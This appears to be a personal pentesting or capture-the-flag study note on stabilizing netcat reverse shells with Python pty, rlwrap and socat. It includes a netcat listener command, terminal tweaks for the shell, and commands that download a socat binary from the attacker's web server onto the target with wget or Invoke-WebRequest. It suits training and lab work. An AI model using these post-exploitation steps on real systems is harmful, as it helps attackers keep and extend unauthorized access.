# Netcat Shell Stabilization

nc shells are non-interactive, as they "shells" really being processes running _inside_ a terminal, rather than being an actual terminal.

## Technique 1: Python

Only applicable to Linux boxes.

1. `python -c 'import pty;pty.spawn("/bin/bash")'`
	- uses Python to spawn a better featured bash shell
	- some targets may need a __version__ of python specified
		- replace `python` with `python2` or `python3`
	- will act better, but won't feature auto-complete and CTRL+C will kill
2. `export TERM=xterm`
	- access to term commands such as `clear`
3. Background the shell using __CTRL+Z__
	- In attack machine -> `stty raw -echo; fg`
		- turns off our own terminal echo
		- foregrounds the shell

== Type `reset` on own terminal if shell dies ==

## Technique 2: rlwrap

`rlwrap` gives access to history, tab autocompletion and the arrow keys upon initial shell. __NOT__ installed by default

`sudo apt install rlwrap`

`rlwrap nc -nvlp <PORT>`

- very useful w/ Windows shells
- On Linux, background the shell w/ Ctrl+Z and use `stty raw -echo; fg` on own terminal

## Technique 3: Socat

Use intial netcat shell as a stepping stone for a fully featured socat shell.

- Limited to Linux targets

Transfer a [socat static compiled binar](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) onto the target.

- Use a webserver on the attack machine inside the directory containing the socat binary

`sudo python3 -m http.server 80`

- On target, use netcat to download the file

`wget <LOCAL_IP>/socat -O /tmp/socat`

- On Windows:

`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`

### Change terminal size

- Open another terminal

`stty -a`

- Note 'rows' and 'columns' count

- In reverse/bind shell:

`stty rows <numbers>`

`stty cols <number>`

